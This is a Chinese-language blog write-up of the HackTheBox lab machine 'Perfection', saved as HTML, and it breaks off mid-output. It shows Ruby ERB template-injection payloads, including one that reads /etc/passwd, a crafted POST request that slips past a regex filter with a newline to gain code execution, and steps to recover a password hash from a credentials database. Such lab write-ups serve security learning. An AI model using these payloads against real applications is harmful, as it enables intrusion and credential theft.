@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Perfection0x1 Nmap1234567891022&#x2F;tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubunt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Perfection">
+<meta property="og:url" content="https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Perfection0x1 Nmap1234567891022&#x2F;tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubunt">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/10-Perfection-asf5645fswe/image-20240304192144-biocj21.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/10-Perfection-asf5645fswe/image-20240304192530-1u8a1w8.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/10-Perfection-asf5645fswe/image-20240304192433-pr2lnm8.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/10-Perfection-asf5645fswe/image-20240304191155-kjdltfl.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/10-Perfection-asf5645fswe/image-20240304192936-aajw1dd.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/10-Perfection-asf5645fswe/image-20240304195059-6yi1ex6.png">
+<meta property="article:published_time" content="2024-03-04T10:27:33.000Z">
+<meta property="article:modified_time" content="2024-07-06T21:38:24.846Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://files.manesec.com/file/maneimg1/2024-htb/10-Perfection-asf5645fswe/image-20240304192144-biocj21.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Perfection</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/03/11/2024-htb-machine/10-FormulaX/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/02/26/2024-htb-machine/08-jab/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&text=HackTheBox - Machine - Perfection"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&title=HackTheBox - Machine - Perfection"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&is_video=false&description=HackTheBox - Machine - Perfection"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Perfection&body=Check out this article: https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&title=HackTheBox - Machine - Perfection"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&title=HackTheBox - Machine - Perfection"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&title=HackTheBox - Machine - Perfection"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&title=HackTheBox - Machine - Perfection"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&name=HackTheBox - Machine - Perfection&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&t=HackTheBox - Machine - Perfection"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Perfection
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-04T10:27:33.000Z" class="dt-published" itemprop="datePublished">2024-03-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Perfection"><a href="#Perfection" class="headerlink" title="Perfection"></a>Perfection</h1><h2 id="0x1-Nmap"><a href="#0x1-Nmap" class="headerlink" title="0x1 Nmap"></a>0x1 Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 80:e4:79:e8:59:28:<span class="built_in">df</span>:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMz41H9QQUPCXN7lJsU+fbjZ/vR4Ho/eacq8LnS89xLx4vsJvjUJCcZgMYAmhHLXIGKnVv16ipqPaDom5cK9tig=</span><br><span class="line">|   256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqNwnyqGqYHNSIjQnv7hRU0UC9Q4oB4g9Pfzuj2qcG4</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 nginx</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">|_http-title: Weighted Grade Calculator</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x2-web服務器探測"><a href="#0x2-web服務器探測" class="headerlink" title="0x2 web服務器探測"></a>0x2 web服務器探測</h2><p>dir掃了一下，什麽都沒有，不過看到了這個： <code>http://10.129.223.72/weighted-grade-calc</code>​ 可以輸入的地方</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/10-Perfection-asf5645fswe/image-20240304192144-biocj21.png" alt="image">​</p>
+<p>隨便打后看到圖片裂開了，看到有後端服務器監聽了3000的端口，也就是sinatra，是個ruby的服務器。</p>
+<blockquote>
+<h1 id="SINATRA"><a href="#SINATRA" class="headerlink" title="SINATRA"></a>SINATRA</h1><p>Sinatra is a DSL for quickly creating web applications in Ruby with minimal effort:</p>
+<p><a target="_blank" rel="noopener" href="https://sinatrarb.com/">https://sinatrarb.com/</a></p>
+</blockquote>
+<p>前端是 <code>WEBrick</code>​ 和 <code>nginx</code>​</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/10-Perfection-asf5645fswe/image-20240304192530-1u8a1w8.png" alt="image">​</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/10-Perfection-asf5645fswe/image-20240304192433-pr2lnm8.png" alt="image">​</p>
+<h2 id="0x3-80-web"><a href="#0x3-80-web" class="headerlink" title="0x3 80 - web"></a>0x3 80 - web</h2><p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/10-Perfection-asf5645fswe/image-20240304191155-kjdltfl.png" alt="image">​</p>
+<p>然後用burp抓包一下看看，看到有回顯aaa，隨手去payload all the things找一個ruby的payload試試看：</p>
+<blockquote>
+<h3 id="Ruby-Code-execution"><a href="#Ruby-Code-execution" class="headerlink" title="Ruby - Code execution"></a>Ruby - Code execution</h3><p>Execute code using SSTI for ERB engine.</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= system(<span class="string">&#x27;cat /etc/passwd&#x27;</span>) %&gt;</span><br><span class="line">&lt;%= <span class="string">`ls /`</span> %&gt;</span><br><span class="line">&lt;%= <span class="variable constant_">IO</span>.popen(<span class="string">&#x27;ls /&#x27;</span>).readlines()  %&gt;</span><br><span class="line">&lt;% <span class="keyword">require</span> <span class="string">&#x27;open3&#x27;</span> %&gt;&lt;% <span class="variable">@a</span>,<span class="variable">@b</span>,<span class="variable">@c</span>,<span class="variable">@d</span>=<span class="title class_">Open3</span>.popen3(<span class="string">&#x27;whoami&#x27;</span>) %&gt;&lt;%= <span class="variable">@b</span>.readline()%&gt;</span><br><span class="line">&lt;% <span class="keyword">require</span> <span class="string">&#x27;open4&#x27;</span> %&gt;&lt;% <span class="variable">@a</span>,<span class="variable">@b</span>,<span class="variable">@c</span>,<span class="variable">@d</span>=<span class="title class_">Open4</span>.popen4(<span class="string">&#x27;whoami&#x27;</span>) %&gt;&lt;%= <span class="variable">@c</span>.readline()%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby---code-execution">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby---code-execution</a></p>
+</blockquote>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /weighted-grade-calc HTTP/1.1</span><br><span class="line">Host: 10.129.223.72</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 193</span><br><span class="line">Origin: http://10.129.223.72</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.129.223.72/weighted-grade-calc</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">category1=aaa&lt;%25%3d+`ls+/`+%25&gt;&amp;grade1=11&amp;weight1=20&amp;category2=bbb&amp;grade2=11&amp;weight2=20&amp;category3=ccc&amp;grade3=11&amp;weight3=20&amp;category4=ddd&amp;grade4=11&amp;weight4=20&amp;category5=eee&amp;grade5=11&amp;weight5=20</span><br></pre></td></tr></table></figure>
+
+<p>返回 <code>Malicious input blocked</code>​ ，也就是存在簡單的waf，嘗試使用 <code>%0a</code>​ 和 <code>%0d</code>​ 繞過看看，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/10-Perfection-asf5645fswe/image-20240304192936-aajw1dd.png" alt="image">​</p>
+<p>這裏就有RCE可以執行了，所以可以在這裏拿一個webshell。</p>
+<h2 id="0x4-shell-in-the-box-user-txt"><a href="#0x4-shell-in-the-box-user-txt" class="headerlink" title="0x4 shell in the box - user.txt"></a>0x4 shell in the box - user.txt</h2><p>裏面有一個 main.rb 打開看看可以看到</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">post <span class="string">&#x27;/weighted-grade-calc&#x27;</span> <span class="keyword">do</span></span><br><span class="line">    total_weight = params[<span class="symbol">:weight1</span>].to_i + params[<span class="symbol">:weight2</span>].to_i + params[<span class="symbol">:weight3</span>].to_i + params[<span class="symbol">:weight4</span>].to_i + params[<span class="symbol">:weight5</span>].to_i</span><br><span class="line">    <span class="keyword">if</span> total_weight != <span class="number">100</span></span><br><span class="line">        <span class="variable">@result</span> = <span class="string">&quot;Please reenter! Weights do not add up to 100.&quot;</span></span><br><span class="line">        erb <span class="symbol">:<span class="string">&#x27;weighted_grade_results&#x27;</span></span></span><br><span class="line">    <span class="keyword">elsif</span> params[<span class="symbol">:category1</span>] =~ <span class="regexp">/^[a-zA-Z0-9\/ ]+$/</span> &amp;&amp; params[<span class="symbol">:category2</span>] =~ <span class="regexp">/^[a-zA-Z0-9\/ ]+$/</span> &amp;&amp; params[<span class="symbol">:category3</span>] =~ <span class="regexp">/^[a-zA-Z0-9\/ ]+$/</span> &amp;&amp; params[<span class="symbol">:category4</span>] =~ <span class="regexp">/^[a-zA-Z0-9\/ ]+$/</span> &amp;&amp; params[<span class="symbol">:category5</span>] =~ <span class="regexp">/^[a-zA-Z0-9\/ ]+$/</span> &amp;&amp; params[<span class="symbol">:grade1</span>] =~ <span class="regexp">/^(?:100|\d&#123;1,2&#125;)$/</span> &amp;&amp; params[<span class="symbol">:grade2</span>] =~ <span class="regexp">/^(?:100|\d&#123;1,2&#125;)$/</span> &amp;&amp; params[<span class="symbol">:grade3</span>] =~ <span class="regexp">/^(?:100|\d&#123;1,2&#125;)$/</span> &amp;&amp; params[<span class="symbol">:grade4</span>] =~ <span class="regexp">/^(?:100|\d&#123;1,2&#125;)$/</span> &amp;&amp; params[<span class="symbol">:grade5</span>] =~ <span class="regexp">/^(?:100|\d&#123;1,2&#125;)$/</span> &amp;&amp; params[<span class="symbol">:weight1</span>] =~ <span class="regexp">/^(?:100|\d&#123;1,2&#125;)$/</span> &amp;&amp; params[<span class="symbol">:weight2</span>] =~ <span class="regexp">/^(?:100|\d&#123;1,2&#125;)$/</span> &amp;&amp; params[<span class="symbol">:weight3</span>] =~ <span class="regexp">/^(?:100|\d&#123;1,2&#125;)$/</span> &amp;&amp; params[<span class="symbol">:weight4</span>] =~ <span class="regexp">/^(?:100|\d&#123;1,2&#125;)$/</span> &amp;&amp; params[<span class="symbol">:weight5</span>] =~ <span class="regexp">/^(?:100|\d&#123;1,2&#125;)$/</span></span><br><span class="line">        <span class="variable">@result</span> = <span class="variable constant_">ERB</span>.new(<span class="string">&quot;Your total grade is &lt;%= ((params[:grade1].to_i * params[:weight1].to_i) + (params[:grade2].to_i * params[:weight2].to_i) + (params[:grade3].to_i * params[:weight3].to_i) + (params[:grade4].to_i * params[:weight4].to_i) + (params[:grade5].to_i * params[:weight5].to_i)) / 100 %&gt;\%&lt;p&gt;&quot;</span> + params[<span class="symbol">:category1</span>] + <span class="string">&quot;: &lt;%= (params[:grade1].to_i * params[:weight1].to_i) / 100 %&gt;\%&lt;/p&gt;&lt;p&gt;&quot;</span> + params[<span class="symbol">:category2</span>] + <span class="string">&quot;: &lt;%= (params[:grade2].to_i * params[:weight2].to_i) / 100 %&gt;\%&lt;/p&gt;&lt;p&gt;&quot;</span> + params[<span class="symbol">:category3</span>] + <span class="string">&quot;: &lt;%= (params[:grade3].to_i * params[:weight3].to_i) / 100 %&gt;\%&lt;/p&gt;&lt;p&gt;&quot;</span> + params[<span class="symbol">:category4</span>] + <span class="string">&quot;: &lt;%= (params[:grade4].to_i * params[:weight4].to_i) / 100 %&gt;\%&lt;/p&gt;&lt;p&gt;&quot;</span> + params[<span class="symbol">:category5</span>] + <span class="string">&quot;: &lt;%= (params[:grade5].to_i * params[:weight5].to_i) / 100 %&gt;\%&lt;/p&gt;&quot;</span>).result(binding)</span><br><span class="line">        erb <span class="symbol">:<span class="string">&#x27;weighted_grade_results&#x27;</span></span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">@result</span> = <span class="string">&quot;Malicious input blocked&quot;</span></span><br><span class="line">        erb <span class="symbol">:<span class="string">&#x27;weighted_grade_results&#x27;</span></span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x5-root"><a href="#0x5-root" class="headerlink" title="0x5 root"></a>0x5 root</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">susan@perfection:~/.ssh$ <span class="built_in">id</span></span><br><span class="line">uid=1001(susan) gid=1001(susan) <span class="built_in">groups</span>=1001(susan),27(sudo)</span><br></pre></td></tr></table></figure>
+
+<p>看到了居然有 <code>sudo</code>​ 組，也就説只要知道了 susan 的密碼就可以拿到root權限。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">???????????? Mails (<span class="built_in">limit</span> 50)                                                                                                                                                             </span><br><span class="line">    39937      4 -rw-r-----   1 root     susan         625 May 14  2023 /var/mail/susan                                                                                                   </span><br><span class="line">    39937      4 -rw-r-----   1 root     susan         625 May 14  2023 /var/spool/mail/susan</span><br></pre></td></tr></table></figure>
+
+<p>走了 linpeas看到 mail 有文本大小，所以打開看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">susan@perfection:~$ <span class="built_in">cat</span> /var/mail/susan</span><br><span class="line">Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials (<span class="string">&#x27;our&#x27;</span> including the other students</span><br><span class="line"></span><br><span class="line"><span class="keyword">in</span> our class) to the new platform. I also suggest a new password specification, to make things easier <span class="keyword">for</span> everyone. The password format is:</span><br><span class="line"></span><br><span class="line">&#123;firstname&#125;_&#123;firstname backwards&#125;_&#123;randomly generated <span class="built_in">integer</span> between 1 and 1,000,000,000&#125;</span><br><span class="line"></span><br><span class="line">Note that all letters of the first name should be convered into lowercase.</span><br><span class="line"></span><br><span class="line">Please hit me with updates on the migration when you can. I am currently registering our university with the platform.</span><br><span class="line"></span><br><span class="line">- Tina, your delightful student</span><br></pre></td></tr></table></figure>
+
+<p>然後就是數據庫文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">???????????? Searching *password* or *credential* files <span class="keyword">in</span> home (<span class="built_in">limit</span> 70)</span><br><span class="line">/etc/pam.d/common-password                                                                                                                                                              </span><br><span class="line">/home/susan/Migration/pupilpath_credentials.db                                                                                                                                            </span><br></pre></td></tr></table></figure>
+
+<p>把 <code>/home/susan/Migration/pupilpath_credentials.db</code>​ 下載到本地，打開得到hash</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/10-Perfection-asf5645fswe/image-20240304195059-6yi1ex6.png" alt="image">​</p>
+<p>得到 hash 是 <code>abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f</code>​，隨手nth一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ nth -t <span class="string">&#x27;abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f&#x27;</span></span><br><span class="line"></span><br><span class="line">  _   _                           _____ _           _          _   _           _   </span><br><span class="line"> | \ | |                         |_   _| |         | |        | | | |         | |  </span><br><span class="line"> |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  </span><br><span class="line"> | . ` |/ _` | <span class="string">&#x27;_ ` _ \ / _ \______| | | &#x27;</span>_ \ / _` | __|______|  _  |/ _` / __| <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string"> | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |</span></span><br><span class="line"><span class="string"> \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://twitter.com/bee_sec_san</span></span><br><span class="line"><span class="string">https://github.com/HashPals/Name-That-Hash </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Most Likely </span></span><br><span class="line"><span class="string">SHA-256, HC: 1400 JtR: raw-sha256 Summary: 256-bit key and is a good partner-function for AES. Can be used in Shadow files.</span></span><br><span class="line"><span class="string">Keccak-256, HC: 17800 </span></span><br><span class="line"><span class="string">Haval-128, JtR: haval-128-4</span></span><br><span class="line"><span 